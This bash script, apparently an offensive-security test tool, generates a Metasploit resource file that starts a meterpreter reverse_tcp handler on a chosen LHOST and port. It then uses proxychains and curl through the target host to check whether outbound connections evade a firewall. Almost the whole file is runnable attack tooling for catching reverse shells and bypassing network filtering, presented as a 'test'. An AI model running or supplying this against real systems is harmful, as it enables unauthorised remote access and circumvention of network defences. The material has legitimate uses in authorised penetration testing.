#!/bin/bash
# Reverse Shell Evasion Test using Metasploit and ProxyChains

# Parameters
LHOST=$1
LPORT=4444
RHOST=$2
TARGET_PORT=$3

if [ -z "$LHOST" ] || [ -z "$RHOST" ] || [ -z "$TARGET_PORT" ]; then
  echo "Usage: ./reverse_shell_test.sh <LHOST> <RHOST> <TARGET_PORT>"
  exit 1
fi

# Prepare directories
mkdir -p scans
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOGFILE="scans/reverse_shell_$TIMESTAMP.log"

# Generate Metasploit resource script
echo "[+] Creating Metasploit reverse shell resource script..."
cat <<EOF > metasploit_reverse_shell.rc
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF

# Run Metasploit handler in background
echo "[+] Launching Metasploit handler..."
msfconsole -q -r metasploit_reverse_shell.rc >> "$LOGFILE" 2>&1 &
MSF_PID=$!
sleep 10

# Attempt connection using proxychains + curl (simulate outbound bypass)
echo "[+] Testing firewall evasion with proxychains and curl..." | tee -a "$LOGFILE"
echo "GET / HTTP/1.1\nHost: $RHOST\nUser-Agent: firewall-test" | proxychains curl -x http://$RHOST:$TARGET_PORT http://$LHOST:$LPORT --connect-timeout 10 >> "$LOGFILE" 2>&1

sleep 10
kill $MSF_PID

echo "[+] Reverse shell test complete. Log saved to $LOGFILE"
